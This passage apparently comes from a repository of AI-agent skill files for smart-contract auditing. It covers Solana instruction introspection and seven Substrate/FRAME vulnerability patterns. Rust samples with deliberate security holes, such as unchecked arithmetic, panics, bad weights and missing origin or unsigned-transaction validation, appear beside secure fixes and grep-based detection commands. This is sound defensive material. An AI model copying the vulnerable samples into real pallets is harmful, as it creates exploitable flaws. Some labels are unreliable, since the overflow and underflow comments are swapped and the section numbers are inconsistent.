instruction\n- [ ] Absolute indexes only when specifically intended\n- [ ] Validate correlation between current and referenced instructions\n- [ ] Cannot reuse same instruction validation across multiple calls\n\n**Mitigation**:\n```rust\n// SECURE: Use relative indexing\nuse solana_program::sysvar::instructions;\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo],\n    instruction_data: &[u8],\n) -> ProgramResult {\n    let instructions_sysvar = &accounts[0];\n\n    // Get current instruction index\n    let current_index = instructions::load_current_index_checked(instructions_sysvar)?;\n\n    // SECURE: Get immediately preceding instruction with relative index\n    if current_index > 0 {\n        let prev_ix = instructions::load_instruction_at_checked(\n            (current_index - 1) as usize,\n            instructions_sysvar\n        )?;\n\n        // This is guaranteed to be the instruction immediately before current\n        // Validate prev_ix is the expected setup instruction\n    }\n\n    Ok(())\n}\n\n// BETTER: Use get_instruction_relative (if available)\nlet prev_ix = instructions::get_instruction_relative(-1, instructions_sysvar)?;\n// Explicitly relative to current instruction\n\n// SECURE: Additional correlation validation\npub fn withdraw(ctx: Context<Withdraw>) -> Result<()> {\n    let instructions_sysvar = &ctx.accounts.instructions_sysvar;\n    let current_ix_index = instructions::load_current_index_checked(instructions_sysvar)?;\n\n    // Must have previous instruction\n    require!(current_ix_index > 0, ErrorCode::NoPreviousInstruction);\n\n    // Get previous instruction\n    let prev_ix_index = current_ix_index - 1;\n    let prev_ix = instructions::load_instruction_at_checked(\n        prev_ix_index as usize,\n        instructions_sysvar\n    )?;\n\n    // Validate previous instruction is deposit to same program\n    require!(\n        prev_ix.program_id == ctx.program_id,\n        ErrorCode::InvalidPreviousProgram\n    );\n\n    // Validate accounts in previous instruction match expectations\n    // This ensures proper correlation between deposit and withdraw\n    require!(\n        prev_ix.accounts[0].pubkey == ctx.accounts.vault.key(),\n        ErrorCode::VaultMismatch\n    );\n\n    Ok(())\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/solana/insecure_instruction_introspection\n\n---\n",
        "plugins/building-secure-contracts/skills/substrate-vulnerability-scanner/SKILL.md": "---\nname: substrate-vulnerability-scanner\ndescription: Scans Substrate/Polkadot pallets for 7 critical vulnerabilities including arithmetic overflow, panic DoS, incorrect weights, and bad origin checks. Use when auditing Substrate runtimes or FRAME pallets.\n---\n\n# Substrate Vulnerability Scanner\n\n## 1. Purpose\n\nSystematically scan Substrate runtime modules (pallets) for platform-specific security vulnerabilities that can cause node crashes, DoS attacks, or unauthorized access. This skill encodes 7 critical vulnerability patterns unique to Substrate/FRAME-based chains.\n\n## 2. When to Use This Skill\n\n- Auditing custom Substrate pallets\n- Reviewing FRAME runtime code\n- Pre-launch security assessment of Substrate chains (Polkadot parachains, standalone chains)\n- Validating dispatchable extrinsic functions\n- Reviewing weight calculation functions\n- Assessing unsigned transaction validation logic\n\n## 3. Platform Detection\n\n### File Extensions & Indicators\n- **Rust files**: `.rs`\n\n### Language/Framework Markers\n```rust\n// Substrate/FRAME indicators\n#[pallet]\npub mod pallet {\n    use frame_support::pallet_prelude::*;\n    use frame_system::pallet_prelude::*;\n\n    #[pallet::config]\n    pub trait Config: frame_system::Config { }\n\n    #[pallet::call]\n    impl<T: Config> Pallet<T> {\n        #[pallet::weight(10_000)]\n        pub fn example_function(origin: OriginFor<T>) -> DispatchResult { }\n    }\n}\n\n// Common patterns\nDispatchResult, DispatchError\nensure!, ensure_signed, ensure_root\nStorageValue, StorageMap, StorageDoubleMap\n#[pallet::storage]\n#[pallet::call]\n#[pallet::weight]\n#[pallet::validate_unsigned]\n```\n\n### Project Structure\n- `pallets/*/lib.rs` - Pallet implementations\n- `runtime/lib.rs` - Runtime configuration\n- `benchmarking.rs` - Weight benchmarks\n- `Cargo.toml` with `frame-*` dependencies\n\n### Tool Support\n- **cargo-fuzz**: Fuzz testing for Rust\n- **test-fuzz**: Property-based testing framework\n- **benchmarking framework**: Built-in weight calculation\n- **try-runtime**: Runtime migration testing\n\n---\n\n## 4. How This Skill Works\n\nWhen invoked, I will:\n\n1. **Search your codebase** for Substrate pallets\n2. **Analyze each pallet** for the 7 vulnerability patterns\n3. **Report findings** with file references and severity\n4. **Provide fixes** for each identified issue\n5. **Check weight calculations** and origin validation\n\n---\n\n## 5. Vulnerability Patterns (7 Critical Patterns)\n\nI check for 7 critical vulnerability patterns unique to Substrate/FRAME. For detailed detection patterns, code examples, mitigations, and testing strategies, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n### Pattern Summary:\n\n1. **Arithmetic Overflow**  CRITICAL\n   - Direct `+`, `-`, `*`, `/` operators wrap in release mode\n   - Must use `checked_*` or `saturating_*` methods\n   - Affects balance/token calculations, reward/fee math\n\n2. **Don't Panic**  CRITICAL - DoS\n   - Panics cause node to stop processing blocks\n   - No `unwrap()`, `expect()`, array indexing without bounds check\n   - All user input must be validated with `ensure!`\n\n3. **Weights and Fees**  CRITICAL - DoS\n   - Incorrect weights allow spam attacks\n   - Fixed weights for variable-cost operations enable DoS\n   - Must use benchmarking framework, bound all input parameters\n\n4. **Verify First, Write Last**  HIGH (Pre-v0.9.25)\n   - Storage writes before validation persist on error (pre-v0.9.25)\n   - Pattern: validate  write  emit event\n   - Upgrade to v0.9.25+ or use manual `#[transactional]`\n\n5. **Unsigned Transaction Validation**  HIGH\n   - Insufficient validation allows spam/replay attacks\n   - Prefer signed transactions\n   - If unsigned: validate parameters, replay protection, authenticate source\n\n6. **Bad Randomness**  MEDIUM\n   - `pallet_randomness_collective_flip` vulnerable to collusion\n   - Must use BABE randomness (`pallet_babe::RandomnessFromOneEpochAgo`)\n   - Use `random(subject)` not `random_seed()`\n\n7. **Bad Origin**  CRITICAL\n   - `ensure_signed` allows any user for privileged operations\n   - Must use `ensure_root` or custom origins (ForceOrigin, AdminOrigin)\n   - Origin types must be properly configured in runtime\n\nFor complete vulnerability patterns with code examples, see [VULNERABILITY_PATTERNS.md](resources/VULNERABILITY_PATTERNS.md).\n\n---\n\n## 6. Scanning Workflow\n\n### Step 1: Platform Identification\n1. Verify Substrate/FRAME framework usage\n2. Check Substrate version (v0.9.25+ has transactional storage)\n3. Locate pallet implementations (`pallets/*/lib.rs`)\n4. Identify runtime configuration (`runtime/lib.rs`)\n\n### Step 2: Dispatchable Analysis\nFor each `#[pallet::call]` function:\n- [ ] Arithmetic: Uses checked/saturating operations?\n- [ ] Panics: No unwrap/expect/indexing?\n- [ ] Weights: Proportional to cost, bounded inputs?\n- [ ] Origin: Appropriate validation level?\n- [ ] Validation: All checks before storage writes?\n\n### Step 3: Panic Sweep\n```bash\n# Search for panic-prone patterns\nrg \"unwrap\\(\\)\" pallets/\nrg \"expect\\(\" pallets/\nrg \"\\[.*\\]\" pallets/  # Array indexing\nrg \" as u\\d+\" pallets/  # Type casts\nrg \"\\.unwrap_or\" pallets/\n```\n\n### Step 4: Arithmetic Safety Check\n```bash\n# Find direct arithmetic\nrg \" \\+ |\\+=| - |-=| \\* |\\*=| / |/=\" pallets/\n\n# Should find checked/saturating alternatives instead\nrg \"checked_add|checked_sub|checked_mul|checked_div\" pallets/\nrg \"saturating_add|saturating_sub|saturating_mul\" pallets/\n```\n\n### Step 5: Weight Analysis\n- [ ] Run benchmarking: `cargo test --features runtime-benchmarks`\n- [ ] Verify weights match computational cost\n- [ ] Check for bounded input parameters\n- [ ] Review weight calculation functions\n\n### Step 6: Origin & Privilege Review\n```bash\n# Find privileged operations\nrg \"ensure_signed\" pallets/ | grep -E \"pause|emergency|admin|force|sudo\"\n\n# Should use ensure_root or custom origins\nrg \"ensure_root|ForceOrigin|AdminOrigin\" pallets/\n```\n\n### Step 7: Testing Review\n- [ ] Unit tests cover all dispatchables\n- [ ] Fuzz tests for panic conditions\n- [ ] Benchmarks for weight calculation\n- [ ] try-runtime tests for migrations\n\n---\n\n## 7. Priority Guidelines\n\n### Critical (Immediate Fix Required)\n- Arithmetic overflow (token creation, balance manipulation)\n- Panic DoS (node crash risk)\n- Bad origin (unauthorized privileged operations)\n\n### High (Fix Before Launch)\n- Incorrect weights (DoS via spam)\n- Verify-first violations (state corruption, pre-v0.9.25)\n- Unsigned validation issues (spam, replay attacks)\n\n### Medium (Address in Audit)\n- Bad randomness (manipulation possible but limited impact)\n\n---\n\n## 8. Testing Recommendations\n\n### Fuzz Testing\n```rust\n// Use test-fuzz for property-based testing\n#[cfg(test)]\nmod tests {\n    use test_fuzz::test_fuzz;\n\n    #[test_fuzz]\n    fn fuzz_transfer(from: AccountId, to: AccountId, amount: u128) {\n        // Should never panic\n        let _ = Pallet::transfer(from, to, amount);\n    }\n\n    #[test_fuzz]\n    fn fuzz_no_panics(call: Call) {\n        // No dispatchable should panic\n        let _ = call.dispatch(origin);\n    }\n}\n```\n\n### Benchmarking\n```bash\n# Run benchmarks to generate weights\ncargo build --release --features runtime-benchmarks\n./target/release/node benchmark pallet \\\n    --chain dev \\\n    --pallet pallet_example \\\n    --extrinsic \"*\" \\\n    --steps 50 \\\n    --repeat 20\n```\n\n### try-runtime\n```bash\n# Test runtime upgrades\ncargo build --release --features try-runtime\ntry-runtime --runtime ./target/release/wbuild/runtime.wasm \\\n    on-runtime-upgrade live --uri wss://rpc.polkadot.io\n```\n\n---\n\n## 9. Additional Resources\n\n- **Building Secure Contracts**: `building-secure-contracts/not-so-smart-contracts/substrate/`\n- **Substrate Documentation**: https://docs.substrate.io/\n- **FRAME Documentation**: https://paritytech.github.io/substrate/master/frame_support/\n- **test-fuzz**: https://github.com/trailofbits/test-fuzz\n- **Substrate StackExchange**: https://substrate.stackexchange.com/\n\n---\n\n## 10. Quick Reference Checklist\n\nBefore completing Substrate pallet audit:\n\n**Arithmetic Safety (CRITICAL)**:\n- [ ] No direct `+`, `-`, `*`, `/` operators in dispatchables\n- [ ] All arithmetic uses `checked_*` or `saturating_*`\n- [ ] Type conversions use `try_into()` with error handling\n\n**Panic Prevention (CRITICAL)**:\n- [ ] No `unwrap()` or `expect()` in dispatchables\n- [ ] No direct array/slice indexing without bounds check\n- [ ] All user inputs validated with `ensure!`\n- [ ] Division operations check for zero divisor\n\n**Weights & DoS (CRITICAL)**:\n- [ ] Weights proportional to computational cost\n- [ ] Input parameters have maximum bounds\n- [ ] Benchmarking used to determine weights\n- [ ] No free (zero-weight) expensive operations\n\n**Access Control (CRITICAL)**:\n- [ ] Privileged operations use `ensure_root` or custom origins\n- [ ] `ensure_signed` only for user-level operations\n- [ ] Origin types properly configured in runtime\n- [ ] Sudo pallet removed before production\n\n**Storage Safety (HIGH)**:\n- [ ] Using Substrate v0.9.25+ OR manual `#[transactional]`\n- [ ] Validation before storage writes\n- [ ] Events emitted after successful operations\n\n**Other (MEDIUM)**:\n- [ ] Unsigned transactions use signed alternative if possible\n- [ ] If unsigned: proper validation, replay protection, authentication\n- [ ] BABE randomness used (not RandomnessCollectiveFlip)\n- [ ] Randomness uses `random(subject)` not `random_seed()`\n\n**Testing**:\n- [ ] Unit tests for all dispatchables\n- [ ] Fuzz tests to find panics\n- [ ] Benchmarks generated and verified\n- [ ] try-runtime tests for migrations\n",
        "plugins/building-secure-contracts/skills/substrate-vulnerability-scanner/resources/VULNERABILITY_PATTERNS.md": "# Substrate Vulnerability Patterns (7 Patterns)\n\nThis document contains detailed descriptions, detection patterns, and mitigations for 7 critical Substrate/FRAME vulnerabilities.\n\n---\n\n## 6.1 ARITHMETIC OVERFLOW  CRITICAL\n\n**Description**: Primitive integer types wrap in release mode instead of panicking on overflow/underflow. In debug mode they panic, but production builds silently produce incorrect values.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Direct arithmetic on primitive types\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    pub fn transfer(origin: OriginFor<T>, amount: u128) -> DispatchResult {\n        let sender = ensure_signed(origin)?;\n        let mut balance = Self::balance_of(&sender);\n\n        // OVERFLOW: balance - amount wraps in release mode!\n        balance = balance - amount;  // If amount > balance, wraps to huge number\n\n        // UNDERFLOW: balance + amount wraps in release mode!\n        balance = balance + amount;  // If balance + amount > u128::MAX, wraps to small number\n\n        Self::set_balance(&sender, balance);\n        Ok(())\n    }\n}\n\n// VULNERABLE: Multiplication overflow\nlet total = price * quantity;  // Wraps if price * quantity > u128::MAX\n```\n\n**What to Check**:\n- [ ] NO direct arithmetic operators (`+`, `-`, `*`, `/`) on primitive types in dispatchables\n- [ ] ALL arithmetic uses `checked_*`, `saturating_*`, or `overflowing_*` methods\n- [ ] Balance updates use safe arithmetic\n- [ ] Reward/fee calculations use safe arithmetic\n- [ ] Type conversions checked for overflow\n\n**Mitigation**:\n```rust\n// SECURE: Use checked arithmetic\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    pub fn transfer(origin: OriginFor<T>, amount: u128) -> DispatchResult {\n        let sender = ensure_signed(origin)?;\n        let balance = Self::balance_of(&sender);\n\n        // checked_sub returns None on underflow\n        let new_balance = balance.checked_sub(amount)\n            .ok_or(Error::<T>::InsufficientBalance)?;\n\n        Self::set_balance(&sender, new_balance);\n        Ok(())\n    }\n\n    pub fn calculate_reward(stakes: u128, rate: u128) -> Result<u128, Error<T>> {\n        // checked_mul returns None on overflow\n        stakes.checked_mul(rate)\n            .ok_or(Error::<T>::ArithmeticOverflow)\n    }\n}\n\n// SECURE: Use saturating arithmetic (when clamping is acceptable)\nuse sp_runtime::traits::Saturating;\n\nlet new_value = old_value.saturating_add(increment);  // Clamps at u128::MAX\nlet new_value = old_value.saturating_sub(decrement);  // Clamps at 0\n```\n\n**Available Safe Methods**:\n```rust\n// CheckedAdd, CheckedSub, CheckedMul, CheckedDiv traits\nvalue.checked_add(other)?\nvalue.checked_sub(other)?\nvalue.checked_mul(other)?\nvalue.checked_div(other)?\n\n// Saturating trait (clamps at min/max)\nvalue.saturating_add(other)\nvalue.saturating_sub(other)\nvalue.saturating_mul(other)\n\n// Overflowing (returns bool flag)\nlet (result, overflowed) = value.overflowing_add(other);\nensure!(!overflowed, Error::<T>::ArithmeticOverflow);\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/arithmetic_overflow\n\n---\n\n## 4.2 DON'T PANIC  CRITICAL - DoS\n\n**Description**: Panics in dispatchable functions cause the node to stop processing blocks, enabling DoS attacks. Production runtime must never panic.\n\n**Detection Patterns**:\n\n### Pattern 1: Array Indexing\n```rust\n// VULNERABLE: Direct array indexing panics on out-of-bounds\npub fn get_validator(index: u32) -> DispatchResult {\n    let validators = Self::validator_set();\n    let validator = validators[index as usize];  // PANIC if index >= len!\n    // ...\n}\n```\n\n### Pattern 2: unwrap() / expect()\n```rust\n// VULNERABLE: unwrap() panics on None\npub fn process_data(origin: OriginFor<T>, data: Vec<u8>) -> DispatchResult {\n    let value = Self::parse_data(&data).unwrap();  // PANIC on parse error!\n    // ...\n}\n\n// VULNERABLE: expect() also panics\nlet sender = ensure_signed(origin).expect(\"must be signed\");  // PANIC!\n```\n\n### Pattern 3: Type Conversions\n```rust\n// VULNERABLE: as casts can panic or produce wrong values\npub fn set_value(origin: OriginFor<T>, value: u128) -> DispatchResult {\n    let small_value = value as u32;  // Truncates if value > u32::MAX!\n    Self::store_value(small_value);\n}\n```\n\n### Pattern 4: Missing Input Validation\n```rust\n// VULNERABLE: No bounds checking on user input\npub fn divide(numerator: u128, denominator: u128) -> DispatchResult {\n    let result = numerator / denominator;  // PANIC if denominator == 0!\n    // ...\n}\n```\n\n**What to Check**:\n- [ ] NO array/slice indexing without bounds check\n- [ ] NO `unwrap()`, `expect()` in dispatchables\n- [ ] NO `as` casts without validation\n- [ ] ALL user input validated before use\n- [ ] Division operations check for zero divisor\n- [ ] All `?` operator paths return DispatchError, not panic\n\n**Mitigation**:\n```rust\n// SECURE: Bounds checking for array access\npub fn get_validator(index: u32) -> DispatchResult {\n    let validators = Self::validator_set();\n    let validator = validators.get(index as usize)\n        .ok_or(Error::<T>::ValidatorIndexOutOfBounds)?;\n    // ...\n}\n\n// SECURE: Handle Result/Option properly\npub fn process_data(origin: OriginFor<T>, data: Vec<u8>) -> DispatchResult {\n    let value = Self::parse_data(&data)\n        .map_err(|_| Error::<T>::InvalidData)?;\n    // ...\n}\n\n// SECURE: Safe type conversions\nuse sp_runtime::traits::TryConvert;\n\npub fn set_value(origin: OriginFor<T>, value: u128) -> DispatchResult {\n    let small_value: u32 = value.try_into()\n        .map_err(|_| Error::<T>::ValueTooLarge)?;\n    Self::store_value(small_value);\n    Ok(())\n}\n\n// SECURE: Input validation with ensure!\npub fn divide(numerator: u128, denominator: u128) -> DispatchResult {\n    ensure!(denominator != 0, Error::<T>::DivisionByZero);\n    let result = numerator / denominator;  // Safe now\n    // ...\n}\n\n// SECURE: Comprehensive validation\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    pub fn create_proposal(\n        origin: OriginFor<T>,\n        title: Vec<u8>,\n        description: Vec<u8>,\n    ) -> DispatchResult {\n        let proposer = ensure_signed(origin)?;\n\n        // Validate all inputs\n        ensure!(title.len() <= 100, Error::<T>::TitleTooLong);\n        ensure!(description.len() <= 1000, Error::<T>::DescriptionTooLong);\n        ensure!(!title.is_empty(), Error::<T>::TitleEmpty);\n\n        // All validation passed, safe to proceed\n        Self::store_proposal(proposer, title, description)?;\n        Ok(())\n    }\n}\n```\n\n**Testing for Panics**:\n```rust\n// Use test-fuzz to find panic conditions\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    #[should_panic]\n    fn test_panics_on_invalid_input() {\n        // This test should NOT panic in production code\n        // If it does, you found a vulnerability\n        Pallet::divide(100, 0).unwrap();\n    }\n\n    // Fuzz testing\n    #[test_fuzz::test_fuzz]\n    fn fuzz_transfer(sender: AccountId, amount: u128) {\n        // Should never panic regardless of input\n        let _ = Pallet::transfer(sender, amount);\n    }\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/dont_panic\n\n---\n\n## 4.3 WEIGHTS AND FEES  CRITICAL - DoS\n\n**Description**: Incorrect weight functions allow cheap calls to expensive operations, enabling DoS attacks by spamming low-fee transactions that consume excessive resources.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Fixed weight for variable-cost operation\n#[pallet::weight(10_000)]  // Same cost regardless of input!\npub fn process_items(origin: OriginFor<T>, items: Vec<Item>) -> DispatchResult {\n    // Processing cost grows with items.len(), but weight is fixed!\n    for item in items {\n        Self::expensive_operation(item);  // O(n) operation\n    }\n    Ok(())\n}\n\n// VULNERABLE: No bounds on input size\n#[pallet::weight(items.len() as u64 * 1000)]  // Weight grows with input\npub fn process_items(origin: OriginFor<T>, items: Vec<Item>) -> DispatchResult {\n    // But no maximum limit! Attacker can send items.len() = 1 billion\n    // and cause block to exceed weight limit\n    Ok(())\n}\n\n// VULNERABLE: Zero weight for non-trivial operation\n#[pallet::weight(0)]  // FREE operation!\npub fn expensive_computation(origin: OriginFor<T>, data: Vec<u8>) -> DispatchResult {\n    let _ = Self::compute_hash_10000_times(&data);  // Expensive but free!\n    Ok(())\n}\n```\n\n**What to Check**:\n- [ ] Weight functions account for input size\n- [ ] Loops have bounded iterations\n- [ ] Storage access counted in weight\n- [ ] Upper bounds enforced on Vec/array parameters\n- [ ] Weights determined empirically via benchmarking\n- [ ] No free/zero-weight dispatchables (unless trivial)\n\n**Mitigation**:\n```rust\n// SECURE: Weight proportional to input size with bounds\n#[pallet::weight({\n    // Ensure items.len() has a reasonable maximum\n    let bounded_len = items.len().min(T::MaxItems::get() as usize);\n    T::DbWeight::get().reads_writes(bounded_len as u64, bounded_len as u64)\n        .saturating_add(T::WeightPerItem::get().saturating_mul(bounded_len as u64))\n})]\npub fn process_items(origin: OriginFor<T>, items: Vec<Item>) -> DispatchResult {\n    // Enforce maximum items\n    ensure!(items.len() <= T::MaxItems::get() as usize, Error::<T>::TooManyItems);\n\n    for item in items {\n        Self::expensive_operation(item);\n    }\n    Ok(())\n}\n\n// SECURE: Use benchmarking framework\n#[pallet::weight(T::WeightInfo::transfer())]\npub fn transfer(\n    origin: OriginFor<T>,\n    dest: T::AccountId,\n    amount: BalanceOf<T>,\n) -> DispatchResult {\n    // Weight calculated by benchmarking.rs\n    // ...\n}\n\n// BETTER: Benchmark with input parameters\n#[pallet::weight(T::WeightInfo::process_items(items.len() as u32))]\npub fn process_items(origin: OriginFor<T>, items: Vec<Item>) -> DispatchResult {\n    ensure!(items.len() <= T::MaxItems::get() as usize, Error::<T>::TooManyItems);\n    // ...\n}\n```\n\n**Benchmarking**:\n```rust\n// benchmarking.rs - Empirically determine weights\n#[benchmarks]\nmod benchmarks {\n    use super::*;\n\n    #[benchmark]\n    fn process_items(n: Linear<1, 100>) {\n        let items: Vec<Item> = (0..n).map(|i| Item::new(i)).collect();\n\n        #[extrinsic_call]\n        process_items(RawOrigin::Signed(caller), items);\n\n        // Verify operation succeeded\n        assert!(SomeStorage::<T>::get().is_some());\n    }\n}\n```\n\n**Configuration Constants**:\n```rust\n#[pallet::config]\npub trait Config: frame_system::Config {\n    // Define maximum bounds\n    #[pallet::constant]\n    type MaxItems: Get<u32>;\n\n    #[pallet::constant]\n    type MaxDataSize: Get<u32>;\n\n    // Weight info from benchmarking\n    type WeightInfo: WeightInfo;\n}\n\n// In runtime/lib.rs\nimpl pallet_example::Config for Runtime {\n    type MaxItems = ConstU32<100>;  // Max 100 items per call\n    type MaxDataSize = ConstU32<10_000>;  // Max 10KB data\n    type WeightInfo = pallet_example::weights::SubstrateWeight<Runtime>;\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/weights_fees\n\n---\n\n## 4.4 VERIFY FIRST, WRITE LAST  HIGH (Pre-v0.9.25)\n\n**Description**: In Substrate versions before v0.9.25, storage writes before validation persist even if the dispatch later fails, allowing attackers to modify state without paying the full cost.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Storage write before validation (pre-v0.9.25)\npub fn claim_reward(origin: OriginFor<T>) -> DispatchResult {\n    let claimer = ensure_signed(origin)?;\n\n    // WRONG: Writing to storage before all validation!\n    <ClaimCount<T>>::mutate(|count| *count += 1);\n\n    // Validation happens AFTER storage write\n    let reward = Self::calculate_reward(&claimer)?;\n    ensure!(reward > 0, Error::<T>::NoReward);\n\n    // If this fails, ClaimCount was still incremented!\n    Self::transfer_reward(&claimer, reward)?;\n\n    Ok(())\n}\n\n// VULNERABLE: Event emitted before validation\npub fn submit_proposal(origin: OriginFor<T>, data: Vec<u8>) -> DispatchResult {\n    let proposer = ensure_signed(origin)?;\n\n    // WRONG: Event before validation\n    Self::deposit_event(Event::ProposalSubmitted(proposer.clone()));\n\n    // Validation after event\n    ensure!(data.len() <= 1000, Error::<T>::DataTooLarge);\n\n    Ok(())\n}\n```\n\n**What to Check**:\n- [ ] Using Substrate v0.9.25+ (transactional storage layer)\n- [ ] OR all validation happens BEFORE any storage writes\n- [ ] OR manual `#[transactional]` attribute used\n- [ ] Events emitted AFTER all validation and state changes\n- [ ] Pattern: validate  write  emit event\n\n**Mitigation**:\n```rust\n// OPTION 1: Upgrade to v0.9.25+ (automatic transactional storage)\n// Storage writes automatically rolled back on error\n\n// OPTION 2: Verify First, Write Last pattern\npub fn claim_reward(origin: OriginFor<T>) -> DispatchResult {\n    let claimer = ensure_signed(origin)?;\n\n    // ALL VALIDATION FIRST\n    let reward = Self::calculate_reward(&claimer)?;\n    ensure!(reward > 0, Error::<T>::NoReward);\n    ensure!(Self::can_transfer(&claimer, reward)?, Error::<T>::TransferFailed);\n\n    // THEN ALL WRITES\n    <ClaimCount<T>>::mutate(|count| *count += 1);\n    Self::transfer_reward(&claimer, reward)?;\n\n    // FINALLY EVENTS\n    Self::deposit_event(Event::RewardClaimed {\n        claimer,\n        amount: reward,\n    });\n\n    Ok(())\n}\n\n// OPTION 3: Manual transactional attribute (pre-v0.9.25)\nuse frame_support::transactional;\n\n#[transactional]  // Rollback all storage on error\npub fn claim_reward(origin: OriginFor<T>) -> DispatchResult {\n    // Storage writes rolled back if function returns Err\n    Ok(())\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/verify_first\n\n---\n\n## 4.5 UNSIGNED TRANSACTION VALIDATION  HIGH\n\n**Description**: Insufficient validation in `ValidateUnsigned` trait allows spam, replay attacks, or spoofed data from offchain workers or external sources.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: No validation in validate_unsigned\n#[pallet::validate_unsigned]\nimpl<T: Config> ValidateUnsigned for Pallet<T> {\n    type Call = Call<T>;\n\n    fn validate_unsigned(_source: TransactionSource, call: &Self::Call) -> TransactionValidity {\n        match call {\n            Call::submit_price { price, .. } => {\n                // WRONG: No validation of price source or replay protection!\n                ValidTransaction::with_tag_prefix(\"OffchainWorker\")\n                    .priority(100)\n                    .build()\n            }\n            _ => InvalidTransaction::Call.into(),\n        }\n    }\n}\n\n// VULNERABLE: No replay protection\npub fn submit_data(origin: OriginFor<T>, data: Vec<u8>) -> DispatchResult {\n    ensure_none(origin)?;  // Unsigned transaction\n    // WRONG: Same data can be submitted multiple times!\n    Self::process_data(data)?;\n    Ok(())\n}\n```\n\n**What to Check**:\n- [ ] Consider using signed transactions instead (strongly preferred)\n- [ ] IF unsigned is necessary:\n  - [ ] All parameters validated in `validate_unsigned`\n  - [ ] Replay protection via nonce or one-time tag\n  - [ ] Data source authenticated (cryptographic signature)\n  - [ ] Rate limiting or spam protection\n  - [ ] Priority set appropriately (high for OCW, low for user-submitted)\n\n**Mitigation**:\n```rust\n// OPTION 1: Use signed transactions (PREFERRED)\n#[pallet::call]\nimpl<T: Config> Pallet<T> {\n    #[pallet::weight(10_000)]\n    pub fn submit_price(\n        origin: OriginFor<T>,  // Signed\n        price: u128,\n        signature: Signature,\n    ) -> DispatchResult {\n        let signer = ensure_signed(origin)?;\n        // Signed transaction provides natural replay protection and authentication\n        Ok(())\n    }\n}\n\n// OPTION 2: Proper unsigned validation (if truly necessary)\n#[pallet::validate_unsigned]\nimpl<T: Config> ValidateUnsigned for Pallet<T> {\n    type Call = Call<T>;\n\n    fn validate_unsigned(source: TransactionSource, call: &Self::Call) -> TransactionValidity {\n        match call {\n            Call::submit_price { price, block_number, signature } => {\n                // 1. Validate signature from authorized source\n                let public_key = Self::authority_key();\n                ensure!(signature.verify(price, block_number, &public_key),\n                    InvalidTransaction::BadProof);\n\n                // 2. Replay protection - check block_number is current\n                let current_block = <frame_system::Pallet<T>>::block_number();\n                ensure!(block_number == current_block,\n                    InvalidTransaction::Stale);\n\n                // 3. One-time submission via unique tag\n                let tag = (b\"price\", block_number).encode();\n\n                ValidTransaction::with_tag_prefix(\"OffchainWorker\")\n                    .priority(TransactionPriority::MAX)\n                    .and_provides(tag)  // Prevents duplicate submission\n                    .longevity(5)  // Valid for 5 blocks\n                    .propagate(true)\n                    .build()\n            }\n            _ => InvalidTransaction::Call.into(),\n        }\n    }\n}\n\n// With replay protection in dispatch\npub fn submit_price(\n    origin: OriginFor<T>,\n    price: u128,\n    block_number: T::BlockNumber,\n) -> DispatchResult {\n    ensure_none(origin)?;\n\n    // Check not already processed\n    ensure!(!<ProcessedBlocks<T>>::contains_key(block_number),\n        Error::<T>::AlreadyProcessed);\n\n    // Mark as processed\n    <ProcessedBlocks<T>>::insert(block_number, true);\n\n    // Process data\n    Self::update_price(price)?;\n\n    Ok(())\n}\n```\n\n**References**: building-secure-contracts/not-so-smart-contracts/substrate/unsigned_validation\n\n---\n\n## 4.6 BAD RANDOMNESS  MEDIUM\n\n**Description**: Using low-security randomness source (`pallet_randomness_collective_flip`) in production allows validator collusion or manipulation.\n\n**Detection Patterns**:\n```rust\n// VULNERABLE: Using RandomnessCollectiveFlip in production\nimpl pallet_example::Config for Runtime {\n    type Randomness = pallet_randomness_collective_flip::RandomnessCollectiveFlip;\n}\n\n// VULNERABLE: Using random_seed() instead of random()\npub fn draw_winner(origin: OriginFor<T>) -> DispatchResult {\n    let seed = T::Randomness::random_seed();  // WRONG: Doesn't incorporate subject\n    let winner_index = Self::pick_from_seed(&seed);\n    // ...\n}\n\n// VULNERABLE: Using randomness for critical security\npub fn generate_secret_key(origin: OriginFor<T>) -> DispatchResult {\n    let random = T::Randomness::random(&b\"secret\"[..]);\n    // BAD: Even with BABE, not sufficient for cryptographic keys!\n    let secret_key = Self::derive_key(random.0);\n    // ...\n}\n```\n\n**What to Check**:\n- [ ] NOT using `pallet_randomness_collective_flip` in production\n- [ ] Using BABE randomness (`pallet_babe::RandomnessFromOneEpochAgo`)\n- [ ] Using `random(subject)` instead of `random_seed()`\n- [ ] NOT using on-chain randomness for cryptographic keys\n- [ ] Understanding randomness can be influenced by validators\n\n**Mitigation**:\n```rust\n// SECURE: Use BABE randomness (production)\nimpl pallet_example::Config for Runtime {\n    // Use BABE VRF for production randomness\n    type Randomness = pallet_babe::RandomnessFromOneEpochAgo<Runtime>;\n}\n\n// SECURE: Use random() with subject, not random_seed()\npub fn draw_winner(origin: OriginFor<T>) -> DispatchResult {\n    let _ = ensure_signed(origin)?;\n\n    // Incorporate subject to make each call's randomness unique\n    let (random_hash, _block_number) = T::Randomness::random(&b\"lottery\"[..]);\n\n    // Convert to integer for selection\n    let random_number = u32::from_le_bytes([\n        random_hash.as_ref()[0],\n        random_hash.as_ref()[1],\n        random_hash.as_ref()[2],\n        random_hash.as_ref()[3],\n    ]);\n\n    let winner_index = random_number % Self::participant_count();\n    Self::award_prize(winner_index)?;\n\n    Ok(())\n}\n\n// SECURE: Don't use on-chain randomness for crypto keys\n// Instead: generate off-chain, store hash on-chain for verification\npub fn register_key(origin: OriginFor<T>, key_hash: Hash) -> DispatchResult {\n    // Store hash of externally-generated key\n    // User generates key off-chain with proper entropy\n    Ok(())\n}\n```\n\n**Randomness Quality by Source**:\n```rust\n// NOT SECURE for production\npallet_randomness_collective_flip  // Low influence, collusion 